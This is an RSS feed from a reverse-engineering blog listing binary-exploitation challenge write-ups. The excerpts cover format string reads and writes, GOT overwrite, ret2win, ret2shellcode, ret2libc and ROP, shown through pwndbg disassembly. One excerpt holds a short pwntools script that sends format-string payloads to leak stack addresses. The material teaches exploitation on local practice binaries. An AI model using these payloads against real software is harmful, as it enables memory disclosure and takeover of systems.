<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Binary Exploitation Series on Reverse Engineering Blog</title><link>https://Cy83rTR0n.github.io/website/tags/binary-exploitation-series/</link><description>Recent content in Binary Exploitation Series on Reverse Engineering Blog</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Tue, 15 Dec 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://Cy83rTR0n.github.io/website/tags/binary-exploitation-series/index.xml" rel="self" type="application/rss+xml"/><item><title>Format String - Write</title><link>https://Cy83rTR0n.github.io/website/posts/arbitary-write/</link><pubDate>Wed, 06 May 2020 21:29:01 +0800</pubDate><guid>https://Cy83rTR0n.github.io/website/posts/arbitary-write/</guid><description>Arbitrary Write ⚖️ Challenge Write-up General Analysis Similar to previous challenge we have format string vulnerability in this challenge also pwndbg&amp;gt; info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x00000000004010c0 putchar@plt 0x00000000004010d0 puts@plt 0x00000000004010e0 fclose@plt 0x00000000004010f0 __stack_chk_fail@plt 0x0000000000401100 printf@plt 0x0000000000401110 fgetc@plt 0x0000000000401120 fopen@plt 0x0000000000401130 __isoc99_scanf@plt 0x0000000000401140 exit@plt 0x0000000000401150 _start 0x0000000000401180 _dl_relocate_static_pie 0x0000000000401190 deregister_tm_clones 0x00000000004011c0 register_tm_clones 0x0000000000401200 __do_global_dtors_aux 0x0000000000401230 frame_dummy 0x0000000000401236 main 0x0000000000401350 __libc_csu_init 0x00000000004013c0 __libc_csu_fini 0x00000000004013c8 _fini pwndbg&amp;gt; So we see that there is only one function of interest to us and that is none other than main.</description></item><item><title>Format String - Read</title><link>https://Cy83rTR0n.github.io/website/posts/arbitary-read/</link><pubDate>Tue, 15 Dec 2020 00:00:00 +0000</pubDate><guid>https://Cy83rTR0n.github.io/website/posts/arbitary-read/</guid><description>Arbitrary Read ⚖️ Challenge Write-up General Analysis Checking for Format String Vulnerability Starting Exploit to find the address leak #!/usr/bin/python3 from pwn import * context.log_level = &amp;#39;error&amp;#39; for i in range(1,50): io = process(&amp;#39;./fmt_read&amp;#39;) payload = f&amp;#39;%{i}$p&amp;#39; io.sendline(payload) print(io.recvall()) io.close() using the above we will be able to get address leaks from stack
Pulling out the password from the leak Enter Password - Pa$$w0rd_1s_0n_Th3_St4ck What you are looking for is here - 0x404080 Enter String - %p.</description></item><item><title>Return Oriented Programming Series - 1</title><link>https://Cy83rTR0n.github.io/website/posts/rop/</link><pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate><guid>https://Cy83rTR0n.github.io/website/posts/rop/</guid><description>Return Oriented Programming ⚖️ Challenge Write-up General Analysis Functions pwndbg&amp;gt; info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x00000000004010a0 setresuid@plt 0x00000000004010b0 setresgid@plt 0x00000000004010c0 system@plt 0x00000000004010d0 printf@plt 0x00000000004010e0 geteuid@plt 0x00000000004010f0 gets@plt 0x0000000000401100 getegid@plt 0x0000000000401110 _start 0x0000000000401140 _dl_relocate_static_pie 0x0000000000401150 deregister_tm_clones 0x0000000000401180 register_tm_clones 0x00000000004011c0 __do_global_dtors_aux 0x00000000004011f0 frame_dummy 0x00000000004011f6 callme 0x0000000000401222 init 0x000000000040126f main 0x00000000004012b0 __libc_csu_init 0x0000000000401320 __libc_csu_fini 0x0000000000401328 _fini pwndbg&amp;gt; pwndbg&amp;gt; disass main Dump of assembler code for function main: 0x000000000040126f &amp;lt;+0&amp;gt;: endbr64 0x0000000000401273 &amp;lt;+4&amp;gt;: push rbp 0x0000000000401274 &amp;lt;+5&amp;gt;: mov rbp,rsp 0x0000000000401277 &amp;lt;+8&amp;gt;: sub rsp,0x20 0x000000000040127b &amp;lt;+12&amp;gt;: mov eax,0x0 0x0000000000401280 &amp;lt;+17&amp;gt;: call 0x401222 &amp;lt;init&amp;gt; 0x0000000000401285 &amp;lt;+22&amp;gt;: lea rdi,[rip+0xd78] # 0x402004 0x000000000040128c &amp;lt;+29&amp;gt;: mov eax,0x0 0x0000000000401291 &amp;lt;+34&amp;gt;: call 0x4010d0 &amp;lt;printf@plt&amp;gt; 0x0000000000401296 &amp;lt;+39&amp;gt;: lea rax,[rbp-0x20] 0x000000000040129a &amp;lt;+43&amp;gt;: mov rdi,rax 0x000000000040129d &amp;lt;+46&amp;gt;: mov eax,0x0 0x00000000004012a2 &amp;lt;+51&amp;gt;: call 0x4010f0 &amp;lt;gets@plt&amp;gt; 0x00000000004012a7 &amp;lt;+56&amp;gt;: mov eax,0x0 0x00000000004012ac &amp;lt;+61&amp;gt;: leave 0x00000000004012ad &amp;lt;+62&amp;gt;: ret End of assembler dump.</description></item><item><title>Overflow - 1</title><link>https://Cy83rTR0n.github.io/website/posts/ret2win/</link><pubDate>Tue, 20 Oct 2020 00:00:00 +0000</pubDate><guid>https://Cy83rTR0n.github.io/website/posts/ret2win/</guid><description>Buffer Overflow (ret2win) ⚖️ Challenge Write-up General Analysis Function Analysis pwndbg&amp;gt; info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x00000000004010b0 puts@plt 0x00000000004010c0 setresuid@plt 0x00000000004010d0 setresgid@plt 0x00000000004010e0 printf@plt 0x00000000004010f0 geteuid@plt 0x0000000000401100 gets@plt 0x0000000000401110 getegid@plt 0x0000000000401120 execl@plt 0x0000000000401130 _start 0x0000000000401160 _dl_relocate_static_pie 0x0000000000401170 deregister_tm_clones 0x00000000004011a0 register_tm_clones 0x00000000004011e0 __do_global_dtors_aux 0x0000000000401210 frame_dummy 0x0000000000401216 win 0x0000000000401259 init 0x00000000004012a6 main 0x0000000000401310 __libc_csu_init 0x0000000000401380 __libc_csu_fini 0x0000000000401388 _fini pwndbg&amp;gt; Disassembly of win pwndbg&amp;gt; disass win Dump of assembler code for function win: 0x0000000000401216 &amp;lt;+0&amp;gt;: endbr64 0x000000000040121a &amp;lt;+4&amp;gt;: push rbp 0x000000000040121b &amp;lt;+5&amp;gt;: mov rbp,rsp 0x000000000040121e &amp;lt;+8&amp;gt;: lea rdi,[rip+0xddf] # 0x402004 0x0000000000401225 &amp;lt;+15&amp;gt;: call 0x4010b0 &amp;lt;puts@plt&amp;gt; 0x000000000040122a &amp;lt;+20&amp;gt;: mov r8d,0x0 0x0000000000401230 &amp;lt;+26&amp;gt;: lea rcx,[rip+0xde5] # 0x40201c 0x0000000000401237 &amp;lt;+33&amp;gt;: lea rdx,[rip+0xde6] # 0x402024 0x000000000040123e &amp;lt;+40&amp;gt;: lea rsi,[rip+0xde2] # 0x402027 0x0000000000401245 &amp;lt;+47&amp;gt;: lea rdi,[rip+0xdd0] # 0x40201c 0x000000000040124c &amp;lt;+54&amp;gt;: mov eax,0x0 0x0000000000401251 &amp;lt;+59&amp;gt;: call 0x401120 &amp;lt;execl@plt&amp;gt; 0x0000000000401256 &amp;lt;+64&amp;gt;: nop 0x0000000000401257 &amp;lt;+65&amp;gt;: pop rbp 0x0000000000401258 &amp;lt;+66&amp;gt;: ret End of assembler dump.</description></item><item><title>Format String - GOT Overwrite</title><link>https://Cy83rTR0n.github.io/website/posts/got-overwrite/</link><pubDate>Fri, 19 Jul 2019 00:00:00 +0000</pubDate><guid>https://Cy83rTR0n.github.io/website/posts/got-overwrite/</guid><description>GOT Overwrite Attack ⚖️ Challenge Write-up General Analysis Functions Analysis pwndbg&amp;gt; info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x0000000000401080 puts@plt 0x0000000000401090 printf@plt 0x00000000004010a0 __isoc99_scanf@plt 0x00000000004010b0 exit@plt 0x00000000004010c0 execl@plt 0x00000000004010d0 _start 0x0000000000401100 _dl_relocate_static_pie 0x0000000000401110 deregister_tm_clones 0x0000000000401140 register_tm_clones 0x0000000000401180 __do_global_dtors_aux 0x00000000004011b0 frame_dummy 0x00000000004011b6 win 0x00000000004011f9 main 0x0000000000401260 __libc_csu_init 0x00000000004012d0 __libc_csu_fini 0x00000000004012d8 _fini pwndbg&amp;gt; Exploit to find where is our input going #!/usr/bin/python3 from pwn import * context.log_level = &amp;#39;error&amp;#39; for i in range(1,50): io = process(&amp;#39;.</description></item><item><title>Overflow - 2</title><link>https://Cy83rTR0n.github.io/website/posts/ret2shellcode/</link><pubDate>Fri, 19 Jul 2019 00:00:00 +0000</pubDate><guid>https://Cy83rTR0n.github.io/website/posts/ret2shellcode/</guid><description>Buffer Overflow (ret2shellcode) ⚖️ Challenge Write-up General Analysis Functions pwndbg&amp;gt; info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x00000000004010b0 puts@plt 0x00000000004010c0 setresuid@plt 0x00000000004010d0 setresgid@plt 0x00000000004010e0 printf@plt 0x00000000004010f0 geteuid@plt 0x0000000000401100 gets@plt 0x0000000000401110 getegid@plt 0x0000000000401120 execl@plt 0x0000000000401130 _start 0x0000000000401160 _dl_relocate_static_pie 0x0000000000401170 deregister_tm_clones 0x00000000004011a0 register_tm_clones 0x00000000004011e0 __do_global_dtors_aux 0x0000000000401210 frame_dummy 0x0000000000401216 win 0x0000000000401259 init 0x00000000004012a6 main 0x0000000000401310 __libc_csu_init 0x0000000000401380 __libc_csu_fini 0x0000000000401388 _fini pwndbg&amp;gt; no win function to call shellcode, need to inject our very own into the system.</description></item><item><title>Return to Libc</title><link>https://Cy83rTR0n.github.io/website/posts/ret2libc/</link><pubDate>Fri, 19 Jul 2019 00:00:00 +0000</pubDate><guid>https://Cy83rTR0n.github.io/website/posts/ret2libc/</guid><description>Return to Libc ⚖️ Challenge Write-up General Analysis Functions pwndbg&amp;gt; info functions All defined functions: Non-debugging symbols: 0x0000000000401000 _init 0x0000000000401090 setresuid@plt 0x00000000004010a0 setresgid@plt 0x00000000004010b0 printf@plt 0x00000000004010c0 geteuid@plt 0x00000000004010d0 gets@plt 0x00000000004010e0 getegid@plt 0x00000000004010f0 _start 0x0000000000401120 _dl_relocate_static_pie 0x0000000000401130 deregister_tm_clones 0x0000000000401160 register_tm_clones 0x00000000004011a0 __do_global_dtors_aux 0x00000000004011d0 frame_dummy 0x00000000004011d6 init 0x0000000000401223 main 0x0000000000401270 __libc_csu_init 0x00000000004012e0 __libc_csu_fini 0x00000000004012e8 _fini pwndbg&amp;gt; pwndbg&amp;gt; disass main Dump of assembler code for function main: 0x0000000000401223 &amp;lt;+0&amp;gt;: endbr64 0x0000000000401227 &amp;lt;+4&amp;gt;: push rbp 0x0000000000401228 &amp;lt;+5&amp;gt;: mov rbp,rsp 0x000000000040122b &amp;lt;+8&amp;gt;: sub rsp,0x20 0x000000000040122f &amp;lt;+12&amp;gt;: mov eax,0x0 0x0000000000401234 &amp;lt;+17&amp;gt;: call 0x4011d6 &amp;lt;init&amp;gt; 0x0000000000401239 &amp;lt;+22&amp;gt;: lea rdi,[rip+0xdc4] # 0x402004 0x0000000000401240 &amp;lt;+29&amp;gt;: mov eax,0x0 0x0000000000401245 &amp;lt;+34&amp;gt;: call 0x4010b0 &amp;lt;printf@plt&amp;gt; 0x000000000040124a &amp;lt;+39&amp;gt;: lea rax,[rbp-0x20] 0x000000000040124e &amp;lt;+43&amp;gt;: mov rdi,rax 0x0000000000401251 &amp;lt;+46&amp;gt;: mov eax,0x0 0x0000000000401256 &amp;lt;+51&amp;gt;: call 0x4010d0 &amp;lt;gets@plt&amp;gt; 0x000000000040125b &amp;lt;+56&amp;gt;: mov eax,0x0 0x0000000000401260 &amp;lt;+61&amp;gt;: leave 0x0000000000401261 &amp;lt;+62&amp;gt;: ret End of assembler dump.</description></item></channel></rss>